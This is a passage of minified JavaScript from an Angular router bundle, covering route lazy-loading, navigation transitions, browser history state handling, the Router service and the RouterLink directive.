              this.onLoadEndListener && this.onLoadEndListener(n),
                (n._loadedComponent = s);
            }),
            Vn(() => {
              this.componentLoaders.delete(n);
            })
          ),
          o = new kn(r, () => new N()).pipe(Nn());
        return this.componentLoaders.set(n, o), o;
      }
      loadChildren(n, r) {
        if (this.childrenLoaders.get(r)) return this.childrenLoaders.get(r);
        if (r._loadedRoutes)
          return x({ routes: r._loadedRoutes, injector: r._loadedInjector });
        this.onLoadStartListener && this.onLoadStartListener(r);
        let s = Mx(r, this.compiler, n, this.onLoadEndListener).pipe(
            Vn(() => {
              this.childrenLoaders.delete(r);
            })
          ),
          a = new kn(s, () => new N()).pipe(Nn());
        return this.childrenLoaders.set(r, a), a;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function Mx(t, e, i, n) {
  return Jt(t.loadChildren()).pipe(
    F(Bm),
    ie((r) =>
      r instanceof Hi || Array.isArray(r) ? x(r) : ee(e.compileModuleAsync(r))
    ),
    F((r) => {
      n && n(t);
      let o,
        s,
        a = !1;
      return (
        Array.isArray(r)
          ? ((s = r), !0)
          : ((o = r.create(i).injector),
            (s = o.get(sa, [], { optional: !0, self: !0 }).flat())),
        { routes: s.map(Lu), injector: o }
      );
    })
  );
}
function Dx(t) {
  return t && "object" == typeof t && "default" in t;
}
function Bm(t) {
  return Dx(t) ? t.default : t;
}
var Bu = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(xx), providedIn: "root" })),
      e
    );
  })(),
  xx = (() => {
    let e = class e {
      shouldProcessUrl(n) {
        return !0;
      }
      extract(n) {
        return n;
      }
      merge(n, r) {
        return n;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Um = new b(""),
  $m = new b("");
function Ex(t, e, i) {
  let n = t.get($m),
    r = t.get(T);
  return t.get(O).runOutsideAngular(() => {
    if (!r.startViewTransition || n.skipNextTransition)
      return (n.skipNextTransition = !1), new Promise((l) => setTimeout(l));
    let o,
      s = new Promise((l) => {
        o = l;
      }),
      a = r.startViewTransition(() => (o(), Ox(t))),
      { onViewTransitionCreated: c } = n;
    return c && dt(t, () => c({ transition: a, from: e, to: i })), s;
  });
}
function Ox(t) {
  return new Promise((e) => {
    Es(e, { injector: t });
  });
}
var Uu = (() => {
  let e = class e {
    get hasRequestedNavigation() {
      return 0 !== this.navigationId;
    }
    constructor() {
      (this.currentNavigation = null),
        (this.currentTransition = null),
        (this.lastSuccessfulNavigation = null),
        (this.events = new N()),
        (this.transitionAbortSubject = new N()),
        (this.configLoader = v(Vu)),
        (this.environmentInjector = v(Oe)),
        (this.urlSerializer = v(Sr)),
        (this.rootContexts = v(Tr)),
        (this.location = v(pt)),
        (this.inputBindingEnabled = null !== v(ca, { optional: !0 })),
        (this.titleStrategy = v(Vm)),
        (this.options = v(Nr, { optional: !0 }) || {}),
        (this.paramsInheritanceStrategy =
          this.options.paramsInheritanceStrategy || "emptyOnly"),
        (this.urlHandlingStrategy = v(Bu)),
        (this.createViewTransition = v(Um, { optional: !0 })),
        (this.navigationId = 0),
        (this.afterPreactivation = () => x(void 0)),
        (this.rootComponentType = null);
      (this.configLoader.onLoadEndListener = (o) =>
        this.events.next(new yu(o))),
        (this.configLoader.onLoadStartListener = (o) =>
          this.events.next(new _u(o)));
    }
    complete() {
      this.transitions?.complete();
    }
    handleNavigationRequest(n) {
      let r = ++this.navigationId;
      this.transitions?.next(Z(C(C({}, this.transitions.value), n), { id: r }));
    }
    setupNavigations(n, r, o) {
      return (
        (this.transitions = new le({
          id: 0,
          currentUrlTree: r,
          currentRawUrl: r,
          extractedUrl: this.urlHandlingStrategy.extract(r),
          urlAfterRedirects: this.urlHandlingStrategy.extract(r),
          rawUrl: r,
          extras: {},
          resolve: null,
          reject: null,
          promise: Promise.resolve(!0),
          source: yr,
          restoredState: null,
          currentSnapshot: o.snapshot,
          targetSnapshot: null,
          currentRouterState: o,
          targetRouterState: null,
          guards: { canActivateChecks: [], canDeactivateChecks: [] },
          guardsResult: null,
        })),
        this.transitions.pipe(
          Q((s) => 0 !== s.id),
          F((s) =>
            Z(C({}, s), {
              extractedUrl: this.urlHandlingStrategy.extract(s.rawUrl),
            })
          ),
          xe((s) => {
            let a = !1,
              c = !1;
            return x(s).pipe(
              xe((l) => {
                if (this.navigationId > s.id)
                  return (
                    this.cancelNavigationTransition(
                      s,
                      "",
                      Re.SupersededByNewNavigation
                    ),
                    ye
                  );
                (this.currentTransition = s),
                  (this.currentNavigation = {
                    id: l.id,
                    initialUrl: l.rawUrl,
                    extractedUrl: l.extractedUrl,
                    trigger: l.source,
                    extras: l.extras,
                    previousNavigation: this.lastSuccessfulNavigation
                      ? Z(C({}, this.lastSuccessfulNavigation), {
                          previousNavigation: null,
                        })
                      : null,
                  });
                let u =
                    !n.navigated ||
                    this.isUpdatingInternalState() ||
                    this.isUpdatedBrowserUrl(),
                  d = l.extras.onSameUrlNavigation ?? n.onSameUrlNavigation;
                if (!u && "reload" !== d) {
                  let f = "";
                  return (
                    this.events.next(
                      new Kt(
                        l.id,
                        this.urlSerializer.serialize(l.rawUrl),
                        f,
                        Xs.IgnoredSameUrlNavigation
                      )
                    ),
                    l.resolve(null),
                    ye
                  );
                }
                if (this.urlHandlingStrategy.shouldProcessUrl(l.rawUrl))
                  return x(l).pipe(
                    xe((f) => {
                      let m = this.transitions?.getValue();
                      return (
                        this.events.next(
                          new pi(
                            f.id,
                            this.urlSerializer.serialize(f.extractedUrl),
                            f.source,
                            f.restoredState
                          )
                        ),
                        m !== this.transitions?.getValue()
                          ? ye
                          : Promise.resolve(f)
                      );
                    }),
                    vx(
                      this.environmentInjector,
                      this.configLoader,
                      this.rootComponentType,
                      n.config,
                      this.urlSerializer,
                      this.paramsInheritanceStrategy
                    ),
                    ce((f) => {
                      (s.targetSnapshot = f.targetSnapshot),
                        (s.urlAfterRedirects = f.urlAfterRedirects),
                        (this.currentNavigation = Z(
                          C({}, this.currentNavigation),
                          { finalUrl: f.urlAfterRedirects }
                        ));
                      let m = new Js(
                        f.id,
                        this.urlSerializer.serialize(f.extractedUrl),
                        this.urlSerializer.serialize(f.urlAfterRedirects),
                        f.targetSnapshot
                      );
                      this.events.next(m);
                    })
                  );
                if (
                  u &&
                  this.urlHandlingStrategy.shouldProcessUrl(l.currentRawUrl)
                ) {
                  let {
                      id: f,
                      extractedUrl: m,
                      source: w,
                      restoredState: M,
                      extras: G,
                    } = l,
                    H = new pi(f, this.urlSerializer.serialize(m), w, M);
                  this.events.next(H);
                  let me = Im(this.rootComponentType).snapshot;
                  return (
                    (this.currentTransition = s =
                      Z(C({}, l), {
                        targetSnapshot: me,
                        urlAfterRedirects: m,
                        extras: Z(C({}, G), {
                          skipLocationChange: !1,
                          replaceUrl: !1,
                        }),
                      })),
                    (this.currentNavigation.finalUrl = m),
                    x(s)
                  );
                }
                {
                  let f = "";
                  return (
                    this.events.next(
                      new Kt(
                        l.id,
                        this.urlSerializer.serialize(l.extractedUrl),
                        f,
                        Xs.IgnoredByUrlHandlingStrategy
                      )
                    ),
                    l.resolve(null),
                    ye
                  );
                }
              }),
              ce((l) => {
                let u = new pu(
                  l.id,
                  this.urlSerializer.serialize(l.extractedUrl),
                  this.urlSerializer.serialize(l.urlAfterRedirects),
                  l.targetSnapshot
                );
                this.events.next(u);
              }),
              F(
                (l) => (
                  (this.currentTransition = s =
                    Z(C({}, l), {
                      guards: kD(
                        l.targetSnapshot,
                        l.currentSnapshot,
                        this.rootContexts
                      ),
                    })),
                  s
                )
              ),
              WD(this.environmentInjector, (l) => this.events.next(l)),
              ce((l) => {
                if (((s.guardsResult = l.guardsResult), hi(l.guardsResult)))
                  throw Am(this.urlSerializer, l.guardsResult);
                let u = new gu(
                  l.id,
                  this.urlSerializer.serialize(l.extractedUrl),
                  this.urlSerializer.serialize(l.urlAfterRedirects),
                  l.targetSnapshot,
                  !!l.guardsResult
                );
                this.events.next(u);
              }),
              Q(
                (l) =>
                  !!l.guardsResult ||
                  (this.cancelNavigationTransition(l, "", Re.GuardRejected), !1)
              ),
              cu((l) => {
                if (l.guards.canActivateChecks.length)
                  return x(l).pipe(
                    ce((u) => {
                      let d = new mu(
                        u.id,
                        this.urlSerializer.serialize(u.extractedUrl),
                        this.urlSerializer.serialize(u.urlAfterRedirects),
                        u.targetSnapshot
                      );
                      this.events.next(d);
                    }),
                    xe((u) => {
                      let d = !1;
                      return x(u).pipe(
                        _x(
                          this.paramsInheritanceStrategy,
                          this.environmentInjector
                        ),
                        ce({
                          next: () => (d = !0),
                          complete: () => {
                            d ||
                              this.cancelNavigationTransition(
                                u,
                                "",
                                Re.NoDataFromResolver
                              );
                          },
                        })
                      );
                    }),
                    ce((u) => {
                      let d = new vu(
                        u.id,
                        this.urlSerializer.serialize(u.extractedUrl),
                        this.urlSerializer.serialize(u.urlAfterRedirects),
                        u.targetSnapshot
                      );
                      this.events.next(d);
                    })
                  );
              }),
              cu((l) => {
                let u = (d) => {
                  let f = [];
                  d.routeConfig?.loadComponent &&
                    !d.routeConfig._loadedComponent &&
                    f.push(
                      this.configLoader.loadComponent(d.routeConfig).pipe(
                        ce((m) => {
                          d.component = m;
                        }),
                        F(() => {})
                      )
                    );
                  for (let m of d.children) f.push(...u(m));
                  return f;
                };
                return sn(u(l.targetSnapshot.root)).pipe(Lt(null), ue(1));
              }),
              cu(() => this.afterPreactivation()),
              xe(() => {
                let { currentSnapshot: l, targetSnapshot: u } = s,
                  d = this.createViewTransition?.(
                    this.environmentInjector,
                    l.root,
                    u.root
                  );
                return d ? ee(d).pipe(F(() => s)) : x(s);
              }),
              F((l) => {
                let u = OD(
                  n.routeReuseStrategy,
                  l.targetSnapshot,
                  l.currentRouterState
                );
                return (
                  (this.currentTransition = s =
                    Z(C({}, l), { targetRouterState: u })),
                  (this.currentNavigation.targetRouterState = u),
                  s
                );
              }),
              ce(() => {
                this.events.next(new Dr());
              }),
              ND(
                this.rootContexts,
                n.routeReuseStrategy,
                (l) => this.events.next(l),
                this.inputBindingEnabled
              ),
              ue(1),
              ce({
                next: (l) => {
                  (a = !0),
                    (this.lastSuccessfulNavigation = this.currentNavigation),
                    this.events.next(
                      new mt(
                        l.id,
                        this.urlSerializer.serialize(l.extractedUrl),
                        this.urlSerializer.serialize(l.urlAfterRedirects)
                      )
                    ),
                    this.titleStrategy?.updateTitle(
                      l.targetRouterState.snapshot
                    ),
                    l.resolve(!0);
                },
                complete: () => {
                  a = !0;
                },
              }),
              st(
                this.transitionAbortSubject.pipe(
                  ce((l) => {
                    throw l;
                  })
                )
              ),
              Vn(() => {
                !a &&
                  !c &&
                  this.cancelNavigationTransition(
                    s,
                    "",
                    Re.SupersededByNewNavigation
                  ),
                  this.currentTransition?.id === s.id &&
                    ((this.currentNavigation = null),
                    (this.currentTransition = null));
              }),
              kt((l) => {
                if (((c = !0), Nm(l)))
                  this.events.next(
                    new Qt(
                      s.id,
                      this.urlSerializer.serialize(s.extractedUrl),
                      l.message,
                      l.cancellationCode
                    )
                  ),
                    SD(l) ? this.events.next(new xr(l.url)) : s.resolve(!1);
                else {
                  this.events.next(
                    new Mr(
                      s.id,
                      this.urlSerializer.serialize(s.extractedUrl),
                      l,
                      s.targetSnapshot ?? void 0
                    )
                  );
                  try {
                    s.resolve(n.errorHandler(l));
                  } catch (u) {
                    this.options.resolveNavigationPromiseOnError
                      ? s.resolve(!1)
                      : s.reject(u);
                  }
                }
                return ye;
              })
            );
          })
        )
      );
    }
    cancelNavigationTransition(n, r, o) {
      let s = new Qt(n.id, this.urlSerializer.serialize(n.extractedUrl), r, o);
      this.events.next(s), n.resolve(!1);
    }
    isUpdatingInternalState() {
      return (
        this.currentTransition?.extractedUrl.toString() !==
        this.currentTransition?.currentUrlTree.toString()
      );
    }
    isUpdatedBrowserUrl() {
      return (
        this.urlHandlingStrategy
          .extract(this.urlSerializer.parse(this.location.path(!0)))
          .toString() !== this.currentTransition?.extractedUrl.toString() &&
        !this.currentTransition?.extras.skipLocationChange
      );
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function Ix(t) {
  return t !== yr;
}
var Px = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(Sx), providedIn: "root" })),
      e
    );
  })(),
  Nu = class {
    shouldDetach(e) {
      return !1;
    }
    store(e, i) {}
    shouldAttach(e) {
      return !1;
    }
    retrieve(e) {
      return null;
    }
    shouldReuseRoute(e, i) {
      return e.routeConfig === i.routeConfig;
    }
  },
  Sx = (() => {
    let e = class e extends Nu {};
    return (
      (e.ɵfac = (() => {
        let n;
        return function (o) {
          return (n || (n = Ji(e)))(o || e);
        };
      })()),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Hm = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(Tx), providedIn: "root" })),
      e
    );
  })(),
  Tx = (() => {
    let e = class e extends Hm {
      constructor() {
        super(...arguments),
          (this.location = v(pt)),
          (this.urlSerializer = v(Sr)),
          (this.options = v(Nr, { optional: !0 }) || {}),
          (this.canceledNavigationResolution =
            this.options.canceledNavigationResolution || "replace"),
          (this.urlHandlingStrategy = v(Bu)),
          (this.urlUpdateStrategy =
            this.options.urlUpdateStrategy || "deferred"),
          (this.currentUrlTree = new Zt()),
          (this.rawUrlTree = this.currentUrlTree),
          (this.currentPageId = 0),
          (this.lastSuccessfulId = -1),
          (this.routerState = Im(null)),
          (this.stateMemento = this.createStateMemento());
      }
      getCurrentUrlTree() {
        return this.currentUrlTree;
      }
      getRawUrlTree() {
        return this.rawUrlTree;
      }
      restoredState() {
        return this.location.getState();
      }
      get browserPageId() {
        return "computed" !== this.canceledNavigationResolution
          ? this.currentPageId
          : this.restoredState()?.ɵrouterPageId ?? this.currentPageId;
      }
      getRouterState() {
        return this.routerState;
      }
      createStateMemento() {
        return {
          rawUrlTree: this.rawUrlTree,
          currentUrlTree: this.currentUrlTree,
          routerState: this.routerState,
        };
      }
      registerNonRouterCurrentEntryChangeListener(n) {
        return this.location.subscribe((r) => {
          "popstate" === r.type && n(r.url, r.state);
        });
      }
      handleRouterEvent(n, r) {
        if (n instanceof pi) this.stateMemento = this.createStateMemento();
        else if (n instanceof Kt) this.rawUrlTree = r.initialUrl;
        else if (n instanceof Js) {
          if (
            "eager" === this.urlUpdateStrategy &&
            !r.extras.skipLocationChange
          ) {
            let o = this.urlHandlingStrategy.merge(r.finalUrl, r.initialUrl);
            this.setBrowserUrl(o, r);
          }
        } else
          n instanceof Dr
            ? ((this.currentUrlTree = r.finalUrl),
              (this.rawUrlTree = this.urlHandlingStrategy.merge(
                r.finalUrl,
                r.initialUrl
              )),
              (this.routerState = r.targetRouterState),
              "deferred" === this.urlUpdateStrategy &&
                (r.extras.skipLocationChange ||
                  this.setBrowserUrl(this.rawUrlTree, r)))
            : n instanceof Qt &&
              (n.code === Re.GuardRejected || n.code === Re.NoDataFromResolver)
            ? this.restoreHistory(r)
            : n instanceof Mr
            ? this.restoreHistory(r, !0)
            : n instanceof mt &&
              ((this.lastSuccessfulId = n.id),
              (this.currentPageId = this.browserPageId));
      }
      setBrowserUrl(n, r) {
        let o = this.urlSerializer.serialize(n);
        if (this.location.isCurrentPathEqualTo(o) || r.extras.replaceUrl) {
          let s = this.browserPageId,
            a = C(C({}, r.extras.state), this.generateNgRouterState(r.id, s));
          this.location.replaceState(o, "", a);
        } else {
          let s = C(
            C({}, r.extras.state),
            this.generateNgRouterState(r.id, this.browserPageId + 1)
          );
          this.location.go(o, "", s);
        }
      }
      restoreHistory(n, r = !1) {
        if ("computed" === this.canceledNavigationResolution) {
          let o = this.browserPageId,
            s = this.currentPageId - o;
          0 !== s
            ? this.location.historyGo(s)
            : this.currentUrlTree === n.finalUrl &&
              0 === s &&
              (this.resetState(n), this.resetUrlToCurrentUrlTree());
        } else
          "replace" === this.canceledNavigationResolution &&
            (r && this.resetState(n), this.resetUrlToCurrentUrlTree());
      }
      resetState(n) {
        (this.routerState = this.stateMemento.routerState),
          (this.currentUrlTree = this.stateMemento.currentUrlTree),
          (this.rawUrlTree = this.urlHandlingStrategy.merge(
            this.currentUrlTree,
            n.finalUrl ?? this.rawUrlTree
          ));
      }
      resetUrlToCurrentUrlTree() {
        this.location.replaceState(
          this.urlSerializer.serialize(this.rawUrlTree),
          "",
          this.generateNgRouterState(this.lastSuccessfulId, this.currentPageId)
        );
      }
      generateNgRouterState(n, r) {
        return "computed" === this.canceledNavigationResolution
          ? { navigationId: n, ɵrouterPageId: r }
          : { navigationId: n };
      }
    };
    return (
      (e.ɵfac = (() => {
        let n;
        return function (o) {
          return (n || (n = Ji(e)))(o || e);
        };
      })()),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  vr = (function (t) {
    return (
      (t[(t.COMPLETE = 0)] = "COMPLETE"),
      (t[(t.FAILED = 1)] = "FAILED"),
      (t[(t.REDIRECTING = 2)] = "REDIRECTING"),
      t
    );
  })(vr || {});
function zm(t, e) {
  t.events
    .pipe(
      Q(
        (i) =>
          i instanceof mt ||
          i instanceof Qt ||
          i instanceof Mr ||
          i instanceof Kt
      ),
      F((i) =>
        i instanceof mt || i instanceof Kt
          ? vr.COMPLETE
          : i instanceof Qt &&
            (i.code === Re.Redirect || i.code === Re.SupersededByNewNavigation)
          ? vr.REDIRECTING
          : vr.FAILED
      ),
      Q((i) => i !== vr.REDIRECTING),
      ue(1)
    )
    .subscribe(() => {
      e();
    });
}
function Ax(t) {
  throw t;
}
var Rx = {
    paths: "exact",
    fragment: "ignored",
    matrixParams: "ignored",
    queryParams: "exact",
  },
  Nx = {
    paths: "subset",
    fragment: "ignored",
    matrixParams: "ignored",
    queryParams: "subset",
  },
  Xt = (() => {
    let e = class e {
      get currentUrlTree() {
        return this.stateManager.getCurrentUrlTree();
      }
      get rawUrlTree() {
        return this.stateManager.getRawUrlTree();
      }
      get events() {
        return this._events;
      }
      get routerState() {
        return this.stateManager.getRouterState();
      }
      constructor() {
        (this.disposed = !1),
          (this.isNgZoneEnabled = !1),
          (this.console = v(Ts)),
          (this.stateManager = v(Hm)),
          (this.options = v(Nr, { optional: !0 }) || {}),
          (this.pendingTasks = v(ir)),
          (this.urlUpdateStrategy =
            this.options.urlUpdateStrategy || "deferred"),
          (this.navigationTransitions = v(Uu)),
          (this.urlSerializer = v(Sr)),
          (this.location = v(pt)),
          (this.urlHandlingStrategy = v(Bu)),
          (this._events = new N()),
          (this.errorHandler = this.options.errorHandler || Ax),
          (this.navigated = !1),
          (this.routeReuseStrategy = v(Px)),
          (this.onSameUrlNavigation =
            this.options.onSameUrlNavigation || "ignore"),
          (this.config = v(sa, { optional: !0 })?.flat() ?? []),
          (this.componentInputBindingEnabled = !!v(ca, { optional: !0 })),
          (this.eventsSubscription = new Y()),
          (this.isNgZoneEnabled = v(O) instanceof O && O.isInAngularZone()),
          this.resetConfig(this.config),
          this.navigationTransitions
            .setupNavigations(this, this.currentUrlTree, this.routerState)
            .subscribe({
              error: (n) => {
                this.console.warn(n);
              },
            }),
          this.subscribeToNavigationEvents();
      }
      subscribeToNavigationEvents() {
        let n = this.navigationTransitions.events.subscribe((r) => {
          try {
            let o = this.navigationTransitions.currentTransition,
              s = this.navigationTransitions.currentNavigation;
            if (null !== o && null !== s)
              if (
                (this.stateManager.handleRouterEvent(r, s),
                r instanceof Qt &&
                  r.code !== Re.Redirect &&
                  r.code !== Re.SupersededByNewNavigation)
              )
                this.navigated = !0;
              else if (r instanceof mt) this.navigated = !0;
              else if (r instanceof xr) {
                let a = this.urlHandlingStrategy.merge(r.url, o.currentRawUrl),
                  c = {
                    info: o.extras.info,
                    skipLocationChange: o.extras.skipLocationChange,
                    replaceUrl:
                      "eager" === this.urlUpdateStrategy || Ix(o.source),
                  };
                this.scheduleNavigation(a, yr, null, c, {
                  resolve: o.resolve,
                  reject: o.reject,
                  promise: o.promise,
                });
              }
            Fx(r) && this._events.next(r);
          } catch (o) {
            this.navigationTransitions.transitionAbortSubject.next(o);
          }
        });
        this.eventsSubscription.add(n);
      }
      resetRootComponentType(n) {
        (this.routerState.root.component = n),
          (this.navigationTransitions.rootComponentType = n);
      }
      initialNavigation() {
        this.setUpLocationChangeListener(),
          this.navigationTransitions.hasRequestedNavigation ||
            this.navigateToSyncWithBrowser(
              this.location.path(!0),
              yr,
              this.stateManager.restoredState()
            );
      }
      setUpLocationChangeListener() {
        this.nonRouterCurrentEntryChangeSubscription ??=
          this.stateManager.registerNonRouterCurrentEntryChangeListener(
            (n, r) => {
              setTimeout(() => {
                this.navigateToSyncWithBrowser(n, "popstate", r);
              }, 0);
            }
          );
      }
      navigateToSyncWithBrowser(n, r, o) {
        let s = { replaceUrl: !0 },
          a = o?.navigationId ? o : null;
        if (o) {
          let l = C({}, o);
          delete l.navigationId,
            delete l.ɵrouterPageId,
            0 !== Object.keys(l).length && (s.state = l);
        }
        let c = this.parseUrl(n);
        this.scheduleNavigation(c, r, a, s);
      }
      get url() {
        return this.serializeUrl(this.currentUrlTree);
      }
      getCurrentNavigation() {
        return this.navigationTransitions.currentNavigation;
      }
      get lastSuccessfulNavigation() {
        return this.navigationTransitions.lastSuccessfulNavigation;
      }
      resetConfig(n) {
        (this.config = n.map(Lu)), (this.navigated = !1);
      }
      ngOnDestroy() {
        this.dispose();
      }
      dispose() {
        this.navigationTransitions.complete(),
          this.nonRouterCurrentEntryChangeSubscription &&
            (this.nonRouterCurrentEntryChangeSubscription.unsubscribe(),
            (this.nonRouterCurrentEntryChangeSubscription = void 0)),
          (this.disposed = !0),
          this.eventsSubscription.unsubscribe();
      }
      createUrlTree(n, r = {}) {
        let f,
          {
            relativeTo: o,
            queryParams: s,
            fragment: a,
            queryParamsHandling: c,
            preserveFragment: l,
          } = r,
          u = l ? this.currentUrlTree.fragment : a,
          d = null;
        switch (c) {
          case "merge":
            d = C(C({}, this.currentUrlTree.queryParams), s);
            break;
          case "preserve":
            d = this.currentUrlTree.queryParams;
            break;
          default:
            d = s || null;
        }
        null !== d && (d = this.removeEmptyProps(d));
        try {
          f = Dm(o ? o.snapshot : this.routerState.snapshot.root);
        } catch {
          ("string" != typeof n[0] || !n[0].startsWith("/")) && (n = []),
            (f = this.currentUrlTree.root);
        }
        return xm(f, n, d, u ?? null);
      }
      navigateByUrl(n, r = { skipLocationChange: !1 }) {
        let o = hi(n) ? n : this.parseUrl(n),
          s = this.urlHandlingStrategy.merge(o, this.rawUrlTree);
        return this.scheduleNavigation(s, yr, null, r);
      }
      navigate(n, r = { skipLocationChange: !1 }) {
        return kx(n), this.navigateByUrl(this.createUrlTree(n, r), r);
      }
      serializeUrl(n) {
        return this.urlSerializer.serialize(n);
      }
      parseUrl(n) {
        try {
          return this.urlSerializer.parse(n);
        } catch {
          return this.urlSerializer.parse("/");
        }
      }
      isActive(n, r) {
        let o;
        if (((o = !0 === r ? C({}, Rx) : !1 === r ? C({}, Nx) : r), hi(n)))
          return sm(this.currentUrlTree, n, o);
        let s = this.parseUrl(n);
        return sm(this.currentUrlTree, s, o);
      }
      removeEmptyProps(n) {
        return Object.entries(n).reduce(
          (r, [o, s]) => (null != s && (r[o] = s), r),
          {}
        );
      }
      scheduleNavigation(n, r, o, s, a) {
        if (this.disposed) return Promise.resolve(!1);
        let c, l, u;
        a
          ? ((c = a.resolve), (l = a.reject), (u = a.promise))
          : (u = new Promise((f, m) => {
              (c = f), (l = m);
            }));
        let d = this.pendingTasks.add();
        return (
          zm(this, () => {
            queueMicrotask(() => this.pendingTasks.remove(d));
          }),
          this.navigationTransitions.handleNavigationRequest({
            source: r,
            restoredState: o,
            currentUrlTree: this.currentUrlTree,
            currentRawUrl: this.currentUrlTree,
            rawUrl: n,
            extras: s,
            resolve: c,
            reject: l,
            promise: u,
            currentSnapshot: this.routerState.snapshot,
            currentRouterState: this.routerState,
          }),
          u.catch((f) => Promise.reject(f))
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function kx(t) {
  for (let e = 0; e < t.length; e++) if (null == t[e]) throw new D(4008, !1);
}
function Fx(t) {
  return !(t instanceof Dr || t instanceof xr);
}
var ua = (() => {
    let e = class e {
      constructor(n, r, o, s, a, c) {
        (this.router = n),
          (this.route = r),
          (this.tabIndexAttribute = o),
          (this.renderer = s),
          (this.el = a),
          (this.locationStrategy = c),
          (this.href = null),
          (this.commands = null),
          (this.onChanges = new N()),
          (this.preserveFragment = !1),
          (this.skipLocationChange = !1),
          (this.replaceUrl = !1);
        let l = a.nativeElement.tagName?.toLowerCase();
        (this.isAnchorElement = "a" === l || "area" === l),
          this.isAnchorElement
            ? (this.subscription = n.events.subscribe((u) => {
                u instanceof mt && this.updateHref();
              }))
            : this.setTabIndexIfNotOnNativeEl("0");
      }
      setTabIndexIfNotOnNativeEl(n) {
        null != this.tabIndexAttribute ||
          this.isAnchorElement ||
          this.applyAttributeValue("tabindex", n);
      }
      ngOnChanges(n) {
        this.isAnchorElement && this.updateHref(), this.onChanges.next(this);
      }
      set routerLink(n) {
        null != n
          ? ((this.commands = Array.isArray(n) ? n : [n]),
            this.setTabIndexIfNotOnNativeEl("0"))
          : ((this.commands = null), this.setTabIndexIfNotOnNativeEl(null));
      }
      onClick(n, r, o, s, a) {
        let c = this.urlTree;
        if (
          null === c ||
          (this.isAnchorElement &&
            (0 !== n ||
              r ||
              o ||
              s ||
              a ||
              ("string" == typeof this.target && "_self" != this.target)))
        )
          return !0;
        let l = {
          skipLocationChange: this.skipLocationChange,
          replaceUrl: this.replaceUrl,
          state: this.state,
          info: this.info,
        };
        return this.router.navigateByUrl(c, l), !this.isAnchorElement;
      }
      ngOnDestroy() {
        this.subscription?.unsubscribe();
      }
      updateHref() {
        let n = this.urlTree;
        this.href =
          null !== n && this.locationStrategy
            ? this.locationStrategy?.prepareExternalUrl(
                this.router.serializeUrl(n)
              )
            : null;
        let r =
          null === this.href
            ? null
            : vp(
                this.href,
                this.el.nativeElement.tagName.toLowerCase(),
                "href"
              );
        this.applyAttributeValue("href", r);
      }
      applyAttributeValue(n, r) {
        let o = this.renderer,
          s = this.el.nativeElement;
        null !== r ? o.setAttribute(s, n, r) : o.removeAttribute(s, n);
      }
      get urlTree() {
        return null === this.commands
          ? null
          : this.router.createUrlTree(this.commands, {
              relativeTo:
                void 0 !== this.relativeTo ? this.relativeTo : this.route,
              queryParams: this.queryParams,
              fragment: this.fragment,
              queryParamsHandling: this.queryParamsHandling,
              preserveFragment: this.preserveFragment,
            });
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(P(Xt), P(Cn), fl("tabindex"), P(xs), P(te), P(Pt));
      }),
      (e.ɵdir = be({
        type: e,
        selectors: [["", "routerLink", ""]],
        hostVars: 1,
        hostBindings: function (r, o) {
          1 & r &&
            oe("click", function (a) {
              return o.onClick(
                a.button,
                a.ctrlKey,
                a.shiftKey,
                a.altKey,
                a.metaKey
              );
            }),
            2 & r && xt("target", o.target);
        },
        inputs: {
          target: "target",
          queryParams: "queryParams",
          fragment: "fragment",
          queryParamsHandling: "queryParamsHandling",
          state: "state",
          info: "info",
          relativeTo: "relativeTo",
          preserveFragment: [
            de.HasDecoratorInputTransform,
            "preserveFragment",
            "preserveFragment",
            Yt,
          ],
          skipLocationChange: [
            de.HasDecoratorInputTransform,
            "skipLocationChange",
            "skipLocationChange",
            Yt,
          ],
          replaceUrl: [
            de.HasDecoratorInputTransform,
            "replaceUrl",
            "replaceUrl",
            Yt,
          ],
          routerLink: "routerLink",
        },
        standalone: !0,
        features: [Wt, Dt],
      })),
      e
    );
  })(),
  aa = class {},
  Lx = (() => {
    let e = class e {
      constructor(n, r, o, s, a) {
        (this.router = n),
          (this.injector = o),
          (this.preloadingStrategy = s),
          (this.loader = a);
      }
      setUpPreloading() {
        this.subscription = this.router.events
          .pipe(
            Q((n) => n instanceof mt),
            Ft(() => this.preload())
          )
          .subscribe(() => {});
      }
      preload() {
        return this.processRoutes(this.injector, this.router.config);
      }
      ngOnDestroy() {
        this.subscription && this.subscription.unsubscribe();
      }
      processRoutes(n, r) {
        let o = [];
        for (let s of r) {
          s.providers &&
            !s._injector &&
            (s._injector = Os(s.providers, n, `Route: ${s.path}`));
          let a = s._injector ?? n,
            c = s._loadedInjector ?? a;
          ((s.loadChildren && !s._loadedRoutes && void 0 === s.canLoad) ||
            (s.loadComponent && !s._loadedComponent)) &&
            o.push(this.preloadConfig(a, s)),
            (s.children || s._loadedRoutes) &&
              o.push(this.processRoutes(c, s.children ?? s._loadedRoutes));
        }
        return ee(o).pipe(At());
      }
      preloadConfig(n, r) {
        return this.preloadingStrategy.preload(r, () => {
          let o;
          o =
            r.loadChildren && void 0 === r.canLoad
              ? this.loader.loadChildren(n, r)
              : x(null);
          let s = o.pipe(
            ie((a) =>
              null === a
                ? x(void 0)
                : ((r._loadedRoutes = a.routes),
                  (r._loadedInjector = a.injector),
                  this.processRoutes(a.injector ?? n, a.routes))
            )
          );
          if (r.loadComponent && !r._loadedComponent) {
